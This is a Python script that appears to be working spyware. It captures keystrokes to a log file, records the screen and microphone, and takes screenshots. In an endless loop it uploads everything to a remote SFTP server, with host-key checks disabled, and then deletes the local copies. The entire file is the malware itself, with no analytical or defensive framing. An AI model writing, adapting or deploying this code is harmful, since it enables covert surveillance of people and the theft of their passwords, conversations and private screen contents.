#!/usr/bin/python3
# for monitoring keyboard
from pynput import keyboard
import logging

logging.basicConfig(filename=('klog.txt'), level=logging.DEBUG, format='%(asctime)s:%(message)s:')

def on_press(key): #captures the keystrokes and output them to the klog.txt 
    logging.info(str(key)) 

## install dependancies:
# pip install pysftp pyautogui numpy opencv-python sounddevice scipy

## What program does:
# Screen records
# records audio
# take screenshots
#capture keystrokes

# for uploading to ftp
import pysftp

# for capturing the video/screenshot
import pyautogui
import cv2
import time
import numpy as np

# for audio
import sounddevice as sd # sounddevice
from scipy.io.wavfile import write

# for multitasking
import threading

# for deleting and creating upload dir
import shutil
import os


# function to screen record
def screenRecord(SecToRecord, ScreenSize):
	print("Screenrecord Thread Started")

	# define the codec
	fourcc = cv2.VideoWriter_fourcc(*"XVID")
	# create the video write object
	out = cv2.VideoWriter("toupload/video.avi", fourcc, 20.0, (ScreenSize))
	starttime = time.time()

	while True:
    	# make a screenshot
		img = pyautogui.screenshot()
    	# convert these pixels to a proper numpy array to work with OpenCV
		frame = np.array(img)
    	# convert colors from BGR to RGB
		frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    	# write the frame
		out.write(frame)
		if time.time() - starttime > SecToRecord:
			break

# screenshots using pyautogui
def screenShot():
	print("Screenshot Thread Started")
	pyautogui.screenshot(r"toupload/screenshot.png")

## records mic
def recordMic():
	print("Record Mic Thread Started")
	fs = 44100  # Sample rate
	seconds = 3  # Duration of recording
	myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
	sd.wait()  # Wait until recording is finished
	write('toupload/mic.wav', fs, myrecording)  # Save as WAV file



# uploads files to sftp server
def uploadToSFTP():
	print("Connecting to ssh server")
	cnopts = pysftp.CnOpts()
	cnopts.hostkeys = None   
	sftp = pysftp.Connection(host= '',username='',password='', cnopts=cnopts) #server credentials
	with sftp.cd("notftp"):
		sftp.put('toupload/video.avi',preserve_mtime=True)
		sftp.put('toupload/screenshot.png',preserve_mtime=True)
		sftp.put('toupload/mic.wav',preserve_mtime=True)
		sftp.put('klog.txt',preserve_mtime=True)
	sftp.close()
	print("Updated server successfully")

listener = keyboard.Listener(on_press=on_press)
listener.start()
while True:
	# create temp folder
	os.mkdir("toupload")

	# create our different threads
	micThread = threading.Thread(target=recordMic)
	screenShotThread = threading.Thread(target=screenShot)
	screenRecordThread = threading.Thread(target=screenRecord, args=(5, (1920, 1080)))
	

	# start the threads
	print("Starting threads")
	micThread.start()
	screenShotThread.start()
	screenRecordThread.start()
	

	# pause main thread until children finish
	print("Waiting for all threads to finish")
	micThread.join()
	screenShotThread.join()
	screenRecordThread.join()
	
	print("All threads finished")

	# upload to ssh
	uploadToSFTP()

	# cleanup
	shutil.rmtree('toupload')

	print("Sleeping")
	time.sleep(1)
